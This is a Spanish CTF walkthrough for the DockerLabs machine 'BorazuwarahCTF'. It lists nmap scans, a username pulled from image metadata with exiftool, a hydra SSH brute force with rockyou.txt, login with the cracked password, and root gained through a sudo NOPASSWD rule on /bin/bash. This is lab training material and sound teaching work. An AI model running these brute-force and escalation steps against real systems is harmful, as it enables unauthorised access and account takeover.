# 🎯 BorazuwarahCTF - DockerLabs

## 🔍 Fase 1: Enumeración inicial

### Escaneo de puertos
`sudo nmap -p- --open -sS -min-rate 5000 -n -Pn 172.17.0.2`
![[Nmap4.png]]
### Escaneo de versiones
`sudo nmap -sV -p22,80 172.17.0.2`
![[Nmap4.2.png]]

---

## 🌐 Fase 2: Reconocimiento web

### Inspeccionar la web con curl
`curl http://172.17.0.2`
![[Curl4.png]]
### Descargar la imagen
`curl -O http://172.17.0.2/imagen.jpeg`
![[Curl4D.png]]
### Analizar metadatos con exiftool
`exiftool imagen.jpeg`
![[Exif4.png]]
**Usuario identificado:** `borazuwarah`

---

## 🔑 Fase 3: Fuerza bruta SSH

`hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 4`
![[Hydra4.png]]
**Credenciales:** `borazuwarah:123456`

---

## 🚪 Fase 4: Acceso SSH
`ssh borazuwarah@172.17.0.2`
Contraseña: `123456`
![[Ssh4.png]]

---

## ⚡ Fase 5: Escalada de privilegios

### Ver permisos sudo
`sudo -l`
![[Sudo4.png]]
**Resultado:**
`(ALL) NOPASSWD: /bin/bash`

### Ejecutar bash como root
`sudo /bin/bash`
![[Root4.png]]
### Verificar root
`whoami`
`root`

---
